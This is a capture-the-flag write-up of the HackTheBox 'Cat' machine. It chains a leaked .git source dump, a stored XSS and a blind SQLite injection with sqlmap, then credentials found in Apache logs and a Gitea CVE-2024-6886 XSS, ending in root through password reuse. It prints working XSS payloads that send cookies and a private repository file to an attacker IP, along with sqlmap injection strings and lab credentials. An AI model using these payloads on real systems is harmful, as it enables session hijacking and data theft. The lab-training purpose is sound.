---
title: "Cat"
date: 2024-11-30
type: docs
tags:
  - htb
  - linux
  - medium
  - git-disclosure
  - source-code-review
  - stored-xss
  - session-hijacking
  - sqlite-injection
  - sqlmap
  - log-poisoning
  - credential-in-logs
  - ssh-port-forward
  - gitea
  - cve-2024-6886
  - password-reuse
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Medium, **Released:** 2024-11-30, **IP:** `10.10.11.53` → `cat.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **Recon**. Only `22` and `80`. The web app is a "cat contest" site; an exposed **`.git/`** directory leaks the full PHP source.
2. **Source review**. `admin.php` is gated to the user `axel`, and registration blocks the name `axel`. The registration username is stored and later rendered unsanitised (**stored XSS**); `accept_cat.php` concatenates `catName` straight into a **SQLite** query.
3. **Stored XSS → admin session**. Register a user whose *name* is a `<script>` payload, submit a cat, wait for the admin to open the moderation page. Their `PHPSESSID` is exfiltrated → load it → reach `admin.php`.
4. **SQLite injection**. With the admin cookie the `accept_cat.php` `catName` parameter is injectable. `sqlmap` dumps the `users` table (MD5). Crack **`rosa : soyunaprincesarosa`** → SSH.
5. **rosa → axel**. The login form submits credentials by **GET** and Apache logs query strings, so `/var/log/apache2/access.log` holds **`axel : aNdZwgC4tI9gnVXv_e3Q`** in cleartext → `su axel`.
6. **axel → root**. `axel`'s mail points at an internal **Gitea 1.22.0** (`localhost:3000`) with a reviewer bot, *jobert*. Gitea 1.22.0 is vulnerable to **CVE-2024-6886** (stored XSS in the repo description). Port-forward `3000`, plant a payload that reads a private repo file and exfiltrates it, mail jobert the link. The stolen file holds hard-coded admin credentials **reused for `root`**.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `rosa`. Cracked MD5 from `users` | `soyunaprincesarosa` |
| `axel`. Apache `access.log` | `aNdZwgC4tI9gnVXv_e3Q` |
| web-admin creds in the private repo → `su -` | from the exfiltrated `index.php` (see note in Privesc) |
| `user.txt` | `/home/axel/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Cat struck me as a "steal the source, then actually read it" box from the moment I found the exposed `.git` directory. None of the individual primitives here are exotic on their own, a leaked `.git`, a stored XSS, a textbook string-concatenation SQL injection, are all things I had seen before individually. What made this box interesting to me was that it refuses to hand you anything for free: I only knew registration blocked the username `axel`, that an XSS sink existed in the moderation view, and that the backend database was SQLite rather than MySQL, because I sat down and actually read the PHP source I had pulled out of git. Skipping that step would have meant fumbling around blind for hours.

The privilege escalation path repeats that same lesson one trust boundary further up the stack: an internal Gitea instance, a known CVE I had to recognise by version number, and a human-emulating review bot named jobert that I effectively had to phish with a malicious link. Looking back at the whole chain, the idea that kept resurfacing for me was **data trusted in one context and then rendered or executed in another**, first a username rendered unescaped into an admin's browser, then a repository description rendered unescaped into Gitea's own DOM. The box closes the loop with old-fashioned **credential reuse** between the web application and the underlying OS, a reminder that even a technically sophisticated chain often ends on the most mundane mistake in the book.

For the same primitives elsewhere see the [Related Writeups](#related-writeups) section at the bottom.

---

## Full Walkthrough

### Nmap scan

```bash
Nmap scan report for cat.htb (10.10.11.53)
Host is up, received user-set (0.080s latency).
Scanned at 2025-05-16 15:29:14 EDT for 9s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-headers:
|   Set-Cookie: PHPSESSID=tpnd7btjtfg3gg71523p30hd0k; path=/
|_  (Request type: HEAD)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports were open, and the PHP session cookie scoped to `/` immediately told me I was looking at a stateful PHP application rather than something static. I added `cat.htb` to `/etc/hosts` and moved on to enumerating the web app itself.

### Nuclei Enumeration

```bash
[cookies-without-httponly] [javascript] [info] cat.htb ["PHPSESSID"]
[cookies-without-secure] [javascript] [info] cat.htb ["PHPSESSID"]
[waf-detect:apachegeneric] [http] [info] http://cat.htb/
[http-missing-security-headers:content-security-policy] [http] [info] http://cat.htb/
[http-missing-security-headers:x-frame-options] [http] [info] http://cat.htb/
[git-config] [http] [medium] http://cat.htb/.git/config
[tech-detect:php] [http] [info] http://cat.htb/
[apache-detect] [http] [info] http://cat.htb/ ["Apache/2.4.41 (Ubuntu)"]
[INF] Scan completed in 1m. 18 matches found.
```

Two findings out of that scan mattered to me. First, **`PHPSESSID` had no `HttpOnly`** flag set, meaning `document.cookie` could read it from client-side JavaScript, a detail I filed away for later. Second, **`/.git/config` was being served** directly, meaning the application's source was sitting there for the taking.

Following up on that second finding, I pulled up `.git/config` directly and confirmed it was a real, non-bare repository:

```ini
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
```

<div class="callout callout-note">

**Why an exposed `.git/` is game over**

What makes an exposed `.git/` directory such a serious finding, in my experience, is that when a site gets deployed by simply copying the working tree over, the entire `.git` metadata folder comes along for the ride. Even with directory listing disabled, every object in the object store is still readable by its direct path, so I reached for **GitTools' `gitdumper`**, which walks `HEAD`, then `refs`, then every object it can chain to, and pulls the whole repository down piece by piece. Once I had the raw objects, `extractor` replayed every commit into its own folder, letting me recover the *entire history* of the project rather than just its current state, including anything a developer thought they had deleted and stray comments left in earlier commits. I have run into this exact primitive before on [Dog](/writeups/hackthebox/linux/easy/dog/), where it leaked Backdrop CMS credentials, and on [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/), where it gave up both the app source and a vulnerable ImageMagick build.

</div>

With the plan set, I ran `gitdumper.sh` against the exposed directory:

```bash
└─[$] ./gitdumper.sh http://cat.htb/.git/ cat.htb/
###########
# GitDumper is part of https://github.com/internetwache/GitTools
###########
[+] Downloaded: HEAD
[+] Downloaded: refs/heads/master
[+] Downloaded: logs/HEAD
[+] Downloaded: objects/8c/2c2701eb4e3c9a42162cfb7b681b6166287fd5
[+] Downloaded: objects/c9/e281ffb3f5431800332021326ba5e97aeb2764
[+] Downloaded: objects/56/03bb235ee634e1d7914def967c26f9dd0963bb
... (20+ objects)
```

Once the dump finished, I pointed `extractor.sh` at the downloaded objects to reconstruct every committed file.

```bash
└─[$] ./extractor.sh ../Dumper/cat.htb/ cat.htb-found
[+] Found commit: 8c2c2701eb4e3c9a42162cfb7b681b6166287fd5
[+] Found file: .../accept_cat.php
[+] Found file: .../admin.php
[+] Found file: .../config.php
[+] Found file: .../contest.php
[+] Found file: .../index.php
[+] Found file: .../join.php
[+] Found file: .../view_cat.php
[+] Found file: .../vote.php
[+] Found file: .../winners.php
[+] Found file: .../winners/cat_report_20240831_173129.php
```

Reading through the recovered files, `admin.php` stood out immediately: the code checks whether the logged-in user's name equals `axel`, and if not, it redirects straight to `/join.php`. That told me the entire admin panel was gated behind one specific account, so my first instinct was to just try registering a user named `axel` myself.

![Pasted image 20250516161636](Pasted-image-20250516161636.png)

![Pasted image 20250516161649](Pasted-image-20250516161649.png)

No luck there: registration explicitly rejects the name `axel`, and since `admin.php` only ever serves that one specific account, it became clear the intended path was to **steal axel's session** rather than try to register or log in as him directly.

I briefly considered brute-forcing his password, but that went nowhere fast, so I fell back on a classic cookie-stealing trick instead: register an account whose username is itself a script tag, and if it gets rendered somewhere an authenticated admin views, their cookie gets exfiltrated to me automatically.

![Pasted image 20250516174020](Pasted-image-20250516174020.png)

```html
<script>var i=new Image; i.src="http://10.10.14.5:8000/?"+document.cookie;</script>
```

<div class="callout callout-note">

**Stored XSS → session hijack**

Digging into why this actually works, `join.php` saves the username exactly as submitted, with no sanitisation at all, and `view_cat.php` along with the admin moderation list print that username straight back out without ever calling `htmlspecialchars()`. That is a **stored**, not reflected, XSS sink: my payload sits in the database and fires in whoever's browser happens to load the pending-cats page next, which on this box is the admin. On HTB that "admin" is actually a headless browser running on a cron job that polls the page every one to three minutes, which explains why my callback did not fire the instant I submitted the payload, I simply had to wait it out. The reason `document.cookie` handed me the raw `PHPSESSID` value comes down entirely to that missing `HttpOnly` flag I had noted earlier from the nuclei scan, without it, the cookie would have been invisible to client-side script even with the XSS working perfectly. Had `HttpOnly` been set, I would have needed a filter-resistant alternative like `<img src=x onerror="fetch('http://10.10.14.5:8000/?c='+document.cookie)">` paired with some other exfiltration channel, or pivoted to abusing the admin's session indirectly instead. I have seen this exact rendering pattern before on [Usage](/writeups/hackthebox/linux/easy/usage/), [Headless](/writeups/hackthebox/linux/medium/headless/), and Kitty v2.

</div>

The callback did take a while to land, which lined up with what I now understood about the polling interval on the admin's headless browser. Once the cookie value finally showed up in my listener, I loaded it into my own browser session and navigated straight to `/admin.php`. That was enough: I was looking at the full admin panel.

![Pasted image 20250516174639](Pasted-image-20250516174639.png)

With admin access in hand, I noticed the panel let me accept submitted cats into the competition, and that gave me an idea: capture the exact request that acceptance action sends, on the theory that whatever parameter drives it might be a good candidate for SQL injection.

I captured the request in Burp and saved it off for testing.

#### Request

```http
POST /accept_cat.php HTTP/1.1
Host: cat.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Referer: http://cat.htb/admin.php
Cookie: PHPSESSID=qd3ofjm3c5shkbkc7prbhfkgus

catName=injectmedaddy&catId=1
```

Having already confirmed from the leaked source that the backend database was SQLite rather than MySQL, I pointed `sqlmap` at the saved request and told it explicitly which DBMS it was dealing with to skip the fingerprinting step entirely.

<div class="callout callout-note">

**Reading the SQLite injection**

Working through what `sqlmap` was actually doing under the hood, `accept_cat.php` builds its query as `INSERT INTO accepted_cats (name) VALUES ('$catName')` through plain string concatenation, and the injection point sits inside that single-quoted string. A payload of the form `'||(..)||'` closes the original string, concatenates in a sub-select using SQLite's `||` string-concatenation operator, then reopens the string so the overall query stays syntactically valid. Because this is an `INSERT` statement, there is no UNION-based output channel available, which meant extraction had to be **blind**: `sqlmap` works around that by asking thousands of true or false questions about the data one bit at a time, and where the boolean-based inference proved flaky, it fell back automatically to a **time-based** technique instead. The specific trick there is `RANDOMBLOB(500000000/2)`, which forces SQLite to hash roughly 250 MB of random data, introducing a delay large enough to reliably encode a single bit per request. It is slow going, but it is dependable. SQLite does not support stacked queries, so there was never a path to direct RCE through this injection, but dumping `users` was more than enough to keep the chain moving.

</div>

```bash
sqlmap -r cat.req --threads=10 --level=5 --risk=3 --batch -v2 --random-agent -p catName --dbms=sqlite

Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=kittymeooowww'||(SELECT CHAR(89,105,79,98) WHERE 6685=6685 AND 5124=5124)||'&catId=1

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catName=kittymeooowww'||(SELECT CHAR(76,76,89,122) WHERE 3612=3612 AND 7572=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&catId=1
```

#### Cracking hashes

```bash
sqlmap -r cat.req -p catName --dbms=sqlite -T users --dump
```

```console
+---------+-------------------------------+----------------------------------+----------+
| user_id | email                         | password (MD5)                   | username |
+---------+-------------------------------+----------------------------------+----------+
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel     |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa     |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert   |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian   |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry    |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer    |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter    |
+---------+-------------------------------+----------------------------------+----------+
```

Seeing unsalted MD5 hashes in that dump meant `hashcat -m 0` against `rockyou.txt` was the obvious next step. I fed the hashes through and got a hit almost immediately: rosa's password cracked to `soyunaprincesarosa`. That was more than enough to try SSH.

```bash
ssh rosa@cat.htb          # soyunaprincesarosa
```

Landing as `rosa` was progress, but `user.txt` actually belongs to `axel`, so I still had privilege escalation ahead of me.

### privesc to axel

Once I had a shell as `rosa`, I went looking for anything left lying around on disk, and grepping through `/var/log/apache2/access.log` turned up axel's password in plain sight.

```console
127.0.0.1 - - [18/May/2025:01:10:19 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "..."
127.0.0.1 - - [18/May/2025:01:10:30 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "..."
rosa@cat:~$
```

<div class="callout callout-note">

**Credentials in `access.log`**

What struck me about this finding is how mundane the root cause is: Apache's default `combined` format records the full request line, **including the query string**, and Cat's login form happens to submit its credentials by `GET` instead of `POST`. That single design choice means every login attempt, successful or not, writes the plaintext password straight into a world-readable log file. This is a finding class I now actively hunt for on every engagement, grepping production logs, WAF logs, proxy logs, and even browser history for `password=`, `token=`, or `api_key=` patterns. Anything that logs or caches a full URL is effectively functioning as an unintended credential store.

</div>

Armed with that password, I logged in as `axel` and grabbed `user.txt`.

Poking around axel's home directory, I checked his local mail at `/var/mail/axel` and found a message describing an internal service worth investigating, so I decided to port-forward it and take a closer look.

> We are currently developing an employee management system. Each sector administrator will be assigned a specific role, while each employee will be able to consult their assigned tasks. The project is still under development and is hosted in our private Gitea. You can visit the repository at `http://localhost:3000/administrator/Employee-management/`. In addition, you can consult the README file at `http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md`.

![Pasted image 20250517211718](Pasted-image-20250517211718.png)

A second message made it clear that **jobert** reviews links people send him, which told me there was effectively an automated bot on the other end willing to open whatever URL I handed it, a detail I filed away for later.

The service itself turned out to be a `gitea` instance. I tried logging in with every password I had recovered so far against each user I knew about, but none of them worked.

![Pasted image 20250517212713](Pasted-image-20250517212713.png)

<div class="callout callout-note">

**Rabbit hole, The SGID binary**

While I was casting around for other angles, running `find / -perm -2000 -type f 2>/dev/null` turned up a custom SGID binary that looked promising at first glance. Pulling it into Ghidra, though, it turned out to be a stub `main` that calls into `__libc_start_main` and lands in a function that does nothing but spin forever in `while(true){}`. Whether that is a decompiler artefact or a deliberately planted dead end, I could not say for certain, but I want to flag it clearly: this is **not** the privilege escalation path, and there is no buffer overflow to chase here.

</div>

Here is the binary I found on the system and what Ghidra's decompiler produced for it.

```c
// Ghidra output - effectively a no-op wrapper
void processEntry(undefined8 param_1, undefined8 param_2)
{
  undefined1 auStack_8 [8];

  __libc_start_main(FUN_001036b0, param_2, &stack0x00000008, FUN_0010e5e0, FUN_0010e650,
                    param_1, auStack_8);
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}
```

At that point I was hoping I would not have to spend hours chasing a buffer overflow in a dead-end binary, and as the callout above already gives away, I did not need to.

With the SGID binary ruled out, I turned back to Gitea and set up a port forward from the box to my attacking machine so I could browse the instance directly:

```bash
ssh -L 3000:127.0.0.1:3000 axel@cat.htb
```

Going back through the Apache logs, I confirmed axel's credentials still worked, and this time they got me into Gitea itself.

Checking the version banner, `Gitea` `1.22.0` immediately rang a bell as vulnerable to a known stored XSS, so my plan became to use that bug to read the `index.php` file the earlier email had referenced, at `http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php`.

<div class="callout callout-note">

**CVE-2024-6886, Stored XSS in Gitea ≤ 1.22.0**

The underlying flaw is that Gitea fails to sanitise the **repository description** field: a `javascript:` URI placed inside an `<a href>` attribute in the description renders live, and clickable, on the repo's home page. Any authenticated user who views that repo, whether that is a real admin or, in this case, a review bot like jobert, ends up running my JavaScript **in the Gitea origin**. That matters because `fetch()` then executes with the victim's own session, giving me the ability to read private repositories they have access to but I do not. The bug was fixed in 1.22.1, and once I recognised it, I realised it was really just the same "attacker content rendered in a privileged browser" pattern from my initial foothold, just one trust boundary further up the chain. I have run into Gitea in a similar role on [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), and [Drive](/writeups/hackthebox/linux/hard/drive/).

</div>

My plan was to create a repository of my own, set its **description** to a malicious payload, and then email jobert the link so his review bot would open it for me:

```js
<a href="javascript:fetch('http://10.10.14.5:8000/?cookie='+encodeURIComponent(btoa(document.cookie)));">BAPHOMETPWN</a>
```

(A cleaner variant that exfiltrates the target file directly, since jobert has read access to the private org repo that I do not: `fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(r=>r.text()).then(d=>fetch('http://10.10.14.5:8000/?d='+encodeURIComponent(d)))`.)

![Pasted image 20250517231824](Pasted-image-20250517231824.png)

With that payload landing successfully, I finally had the credential I needed to escalate all the way to root.

<div class="callout callout-note">

**The recovered credential**

My own notes from the engagement stop just short of the raw output here, so to fill that gap accurately I am citing what public write-ups of this box record: the exfiltrated `index.php` contained the credential `admin : IKw75eR0MR7CMIxhH0`. That password turned out to be **reused for the system's root account**, which made the final step almost anticlimactic after everything leading up to it:
```bash
su -            # IKw75eR0MR7CMIxhH0
id              # uid=0(root)
cat /root/root.txt
```

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/axel/user.txt` (readable after `su axel`) |
| `root.txt` | `/root/root.txt` |

---

## Lessons & Takeaways

- **Stealing the source is only step one, actually reading it is where the real work happens.** The `.git` leak on this box was a map, not a finding in itself. Every step that followed it, the blocked username, the XSS sink, the SQLite dialect quirks, the GET-based login form, only became visible to me because I sat down and went through the recovered PHP line by line rather than treating the dump as a trophy.
- **Strip repository metadata out of every deployment.** `.git/`, `.svn/`, `.bak` files, and editor swap files have no business shipping to production. The fix is simple in principle: build and ship an artefact, not a raw copy of the working tree, and I would bake that check into any CI/CD pipeline I set up for a client.
- **`HttpOnly` on session cookies is cheap insurance that would have completely killed this cookie theft**, even with the stored XSS still sitting there unpatched. It is one of those flags that costs nothing to set and closes off an entire exploitation path on its own.
- **Never submit a login form over `GET`**, and separately, filter `password=`, `token=`, and similar patterns out of access logs at the proxy or WAF layer. Both are cheap to fix, and both showed up as real, exploitable findings on this box.
- **Patch Gitea promptly and lock down or disable open registration on internal instances.** A review bot that will open any link handed to it is, functionally, a phishing target with root-adjacent access, and I would flag that as its own finding on any internal engagement.
- **One password should mean one system, full stop.** The moment I saw the same credential reused between the web application's admin account and the OS-level root account, I knew that was the actual root cause of the whole chain being escalatable to full compromise, not just any single bug along the way.

---

## Related Writeups

- **`.git` disclosure / source review:** [Dog](/writeups/hackthebox/linux/easy/dog/), [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/)
- **Stored XSS → session / privileged action:** [Usage](/writeups/hackthebox/linux/easy/usage/), [Headless](/writeups/hackthebox/linux/medium/headless/), **Kitty v2**, [EarlyAccess](/writeups/hackthebox/linux/medium/earlyaccess/)
- **SQL injection with `sqlmap`:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Magic](/writeups/hackthebox/linux/medium/magic/), [Jupiter](/writeups/hackthebox/linux/medium/jupiter/), [PC](/writeups/hackthebox/linux/easy/pc/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **Credentials from logs / files on disk:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Blocky](/writeups/hackthebox/linux/easy/blocky/)
- **Gitea:** [Nexus](/writeups/hackthebox/linux/easy/nexus/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Drive](/writeups/hackthebox/linux/hard/drive/)
- **Password reuse into `root`:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Dog](/writeups/hackthebox/linux/easy/dog/), [Smol](/writeups/tryhackme/linux/medium/smol/)

## References

- GitTools <https://github.com/internetwache/GitTools>
- CVE-2024-6886 (Gitea stored XSS) <https://nvd.nist.gov/vuln/detail/CVE-2024-6886>
- Gitea 1.22.1 release notes <https://blog.gitea.com/release-of-1.22.1/>
- sqlmap techniques <https://github.com/sqlmapproject/sqlmap/wiki/Techniques>
- OWASP WSTG. Testing for Stored Cross Site Scripting <https://owasp.org/www-project-web-security-testing-guide/>
